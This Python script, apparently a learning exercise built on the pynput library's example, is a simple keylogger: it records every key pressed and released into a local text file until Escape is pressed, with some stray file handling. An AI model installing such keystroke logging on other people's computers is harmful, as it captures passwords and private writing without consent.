from pynput import keyboard
import os



a=open('keyboard.txt','w')


if os.path.exists("keyboard.txt'"):
    f = open("keyboard.txt'", "a")
else:
    f = open("keyboard.txt'", "x")

def on_press(key):
    try:
        print('alphanumeric key {0} pressed'.format(
            key.char))
        text = ('alphanumeric key {0} pressed'.format(
            key.char))
        a.write(str(text))
    except AttributeError:
        print('special key {0} pressed'.format(
            key))
        
        text = ('special key {0} pressed'.format(
            key))
        a.write(str(text))

def on_release(key):
    text = ('{0} released'.format(
        key))
    print(text)
    li = []
    for i in text:
        li += i
    a.write(f'{text} \n')
    a.flush()

    
    if key == keyboard.Key.esc:
        # Stop listener
        return False
# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
    
a.close()


with open("prova3.txt", "r", encoding='utf-8-sig') as f:
    string = f.read()
    
    
# ...or, in a non-blocking fashion:
# listener = keyboard.Listener(
#     on_press=on_press,
#     on_release=on_release)
# listener.start()


